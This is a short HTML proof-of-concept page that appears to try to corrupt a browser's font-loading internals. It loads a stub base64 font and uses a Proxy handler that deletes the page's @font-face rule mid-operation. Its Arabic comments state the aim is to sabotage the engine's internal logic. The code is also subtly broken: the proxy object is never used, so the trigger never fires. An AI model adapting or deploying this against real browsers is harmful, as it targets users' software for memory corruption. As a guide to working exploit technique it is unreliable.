<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url(data:font/woff2;base64,d09GMgABAAAAA); }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace;">Initiating...</div>

    <script>
        const debug = document.getElementById('debug');

        function trigger() {
            let A = new FontFace('x', 'url(data:font/woff2;base64,d09GMgABAAAAA)');
            document.fonts.add(A);

            // نستخدم Proxy بدلاً من التعديل المباشر
            // Proxy يعطينا سيطرة أكبر على العمليات التي يقوم بها المحرك على الكائن
            let handler = {
                get(target, prop, receiver) {
                    if (prop === 'status') {
                        // هنا نغير الـ status يدوياً لتخريب المنطق الداخلي
                        document.getElementById('s').sheet.deleteRule(0);
                    }
                    return Reflect.get(...arguments);
                }
            };
            let proxyA = new Proxy(A, handler);

            A.load().then(() => {
                debug.innerText = "Done!";
            }).catch((e) => {
                debug.innerText = "Caught: " + e.message;
            });
        }

        setTimeout(trigger, 1000);
    </script>
</body>
</html>
